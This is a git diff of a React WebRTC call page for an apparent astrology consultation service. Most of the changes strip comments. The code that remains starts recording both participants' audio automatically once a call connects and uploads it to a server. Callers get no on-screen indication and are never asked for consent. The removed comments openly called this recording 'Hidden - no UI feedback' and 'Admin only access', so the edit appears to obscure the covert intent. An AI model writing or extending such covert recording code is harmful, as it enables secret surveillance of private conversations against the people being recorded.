@@ -9,9 +9,7 @@ import { removeActiveRequest } from "@/app/redux/reducer/chat/sendRequestSlice";
 import { useQuery, useMutation } from "@apollo/client/react";
 import { gql } from "@apollo/client";
 
-// =========================
-// GRAPHQL MUTATION - UPLOAD CALL RECORDING
-// =========================
+
 const UPLOAD_CALL_RECORDING = gql`
   mutation UploadCallRecording(
     $recording: Upload!
@@ -72,9 +70,6 @@ export default function CallPage( room_Id,
   const [uploadRecording, { loading: uploadLoading, error: uploadError }] =
     useMutation(UPLOAD_CALL_RECORDING);
 
-  // =========================
-  // REFS
-  // =========================
   const pc = useRef(null);
 
   const remoteAudio = useRef(null);
@@ -93,9 +88,7 @@ export default function CallPage( room_Id,
   const remoteStreamRef = useRef(null);
   const callFullyConnectedRef = useRef(false);
 
-  // =========================
-  // STATE
-  // =========================
+
   const [callStatus, setCallStatus] = useState("Connecting...");
   const [isMuted, setIsMuted] = useState(false);
   const [waveHeights, setWaveHeights] = useState(Array(20).fill(10));
@@ -147,39 +140,30 @@ export default function CallPage( room_Id,
     };
   }, [remoteAudio.current?.srcObject]);
 
-  // =========================
-  // RECORDING FUNCTIONS (Hidden - no UI feedback)
-  // =========================
 
-  // Start recording function - Automatic & Hidden
   const startRecording = () => {
     try {
-      // Prevent multiple initialization
+  
       if (recordingInitializedRef.current) {
         return;
       }
 
-      // Check if MediaRecorder is supported
       if (!window.MediaRecorder) {
         return;
       }
 
-      // Check if call is fully connected
       if (!callFullyConnectedRef.current) {
         setTimeout(() => startRecording(), 1000);
         return;
       }
 
-      // Get the remote stream
       let remoteStream = null;
       if (remoteAudio.current?.srcObject) {
         remoteStream = remoteAudio.current.srcObject;
       }
 
-      // Create combined stream for recording
       const combinedStream = new MediaStream();
 
-      // Add local audio tracks
       if (localStream.current) {
         const localTracks = localStream.current.getAudioTracks();
         localTracks.forEach((track) => {
@@ -191,7 +175,6 @@ export default function CallPage( room_Id,
         return;
       }
 
-      // Add remote audio tracks
       if (remoteStream) {
         const remoteTracks = remoteStream.getAudioTracks();
         remoteTracks.forEach((track) => {
@@ -264,7 +247,7 @@ export default function CallPage( room_Id,
     }
   };
 
-  // Stop recording function
+
   const stopRecording = () => {
     try {
       if (mediaRecorderRef.current && isRecordingRef.current) {
@@ -286,7 +269,7 @@ export default function CallPage( room_Id,
     }
   };
 
-  // Send recording to server using GraphQL (Admin only access)
+
   const sendRecordingToServer = async () => {
     try {
       if (recordedChunksRef.current.length === 0) {
@@ -299,10 +282,7 @@ export default function CallPage( room_Id,
         type: mediaRecorderRef.current?.mimeType || "audio/webm",
       });
 
-      // ===========================================
-      // Get data from localStorage
-      // ===========================================
-      //debugger;
+
       let astroData = null;
       let userId = null;
       let astroId = "";
@@ -318,11 +298,10 @@ export default function CallPage( room_Id,
         console.warn("Could not parse data from localStorage:", e);
       }
 
-      // If we still don't have astroId, try to get it from the session via socket or API
       if (!astroId) {
-        // The resolver will try to get it from the session
+
       }
-      // Create File object for GraphQL upload
+
       const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
       const filename = `call-${roomId}-${timestamp}.webm`;
 
@@ -334,7 +313,7 @@ export default function CallPage( room_Id,
         (Date.now() - callStartTimeRef.current) / 1000,
       );
 
-      // Upload using GraphQL mutation
+
       const { data, errors } = await uploadRecording({
         variables: {
           recording: file,
@@ -376,9 +355,6 @@ export default function CallPage( room_Id,
     }
   };
 
-  // =========================
-  // USE EFFECT
-  // =========================
   useEffect(() => {
     let activeSocket = socket;
 
@@ -388,9 +364,6 @@ export default function CallPage( room_Id,
 
     if (!activeSocket) return;
 
-    // =========================
-    // CREATE PEER
-    // =========================
     const createPeer = async () => {
       if (pc.current) {
         return pc.current;
@@ -419,9 +392,6 @@ export default function CallPage( room_Id,
 
       pc.current = new RTCPeerConnection(iceConfig);
 
-      // =========================
-      // CONNECTION STATES
-      // =========================
       pc.current.onconnectionstatechange = () => {
         // When connection is fully established, trigger recording
         if (pc.current.connectionState === "connected") {
@@ -459,9 +429,6 @@ export default function CallPage( room_Id,
 
       pc.current.onicegatheringstatechange = () => {};
 
-      // =========================
-      // GET USER MEDIA
-      // =========================
       try {
         localStream.current = await navigator.mediaDevices.getUserMedia({
           audio: {
@@ -490,9 +457,6 @@ export default function CallPage( room_Id,
         return;
       }
 
-      // =========================
-      // REMOTE TRACK
-      // =========================
       pc.current.ontrack = async (event) => {
         const remoteStream = event.streams[0];
 
@@ -524,9 +488,6 @@ export default function CallPage( room_Id,
         }, 2000);
       };
 
-      // =========================
-      // ICE CANDIDATES
-      // =========================
       pc.current.onicecandidate = (event) => {
         if (event.candidate) {
           activeSocket.emit("ice-candidate", {
@@ -538,9 +499,7 @@ export default function CallPage( room_Id,
         }
       };
 
-      // =========================
-      // AUDIO STATS
-      // =========================
+
       statsIntervalRef.current = setInterval(async () => {
         if (!pc.current) return;
         try {
@@ -559,16 +518,13 @@ export default function CallPage( room_Id,
       return pc.current;
     };
 
-    // =========================
-    // PEER JOINED
-    // =========================
 
     activeSocket.on("peer_joined", async () => {
       setCallStatus("Ringing...");
 
       const peer = await createPeer();
 
-      // WAIT TRACK INIT
+
       await new Promise((resolve) => setTimeout(resolve, 1000));
 
       // Check if peer exists before accessing getSenders
@@ -577,9 +533,6 @@ export default function CallPage( room_Id,
         return;
       }
 
-      // =========================
-      // CREATE OFFER
-      // =========================
 
       try {
         const offer = await peer.createOffer({
@@ -598,9 +551,7 @@ export default function CallPage( room_Id,
       }
     });
 
-    // =========================
-    // ANSWER
-    // =========================
+
 
     activeSocket.on("answer", async ({ answer }) => {
       if (!pc.current) {
@@ -647,9 +598,7 @@ export default function CallPage( room_Id,
       }
     });
 
-    // =========================
-    // ICE RECEIVED
-    // =========================
+
     activeSocket.on("ice-candidate", async ({ candidate, room_id }) => {
       if (!pc.current) {
         return;
@@ -671,9 +620,7 @@ export default function CallPage( room_Id,
       }
     });
 
-    // =========================
-    // CALL ENDED
-    // =========================
+
 
     activeSocket.on("call_ended_by_astrologer", () => {
       // Stop recording before cleanup (hidden)
@@ -687,17 +634,12 @@ export default function CallPage( room_Id,
       router.push("/astrologer/call");
     });
 
-    // =========================
-    // JOIN ROOM
-    // =========================
+
 
     activeSocket.emit("join_call", {
       roomId,
     });
 
-    // =========================
-    // CLEANUP
-    // =========================
 
     return () => {
       // Stop recording on unmount (hidden)
@@ -747,9 +689,6 @@ export default function CallPage( room_Id,
     };
   }, [callStatus]);
 
-  // =========================
-  // END CALL
-  // =========================
   const handleEndCall = () => {
     const stored = localStorage.getItem(`call_request_${roomId}`);
 
@@ -772,9 +711,6 @@ export default function CallPage( room_Id,
     router.push("/astrologer/call");
   };
 
-  // =========================
-  // TOGGLE MUTE
-  // =========================
   const toggleMute = () => {
     if (!localStream.current) return;
 
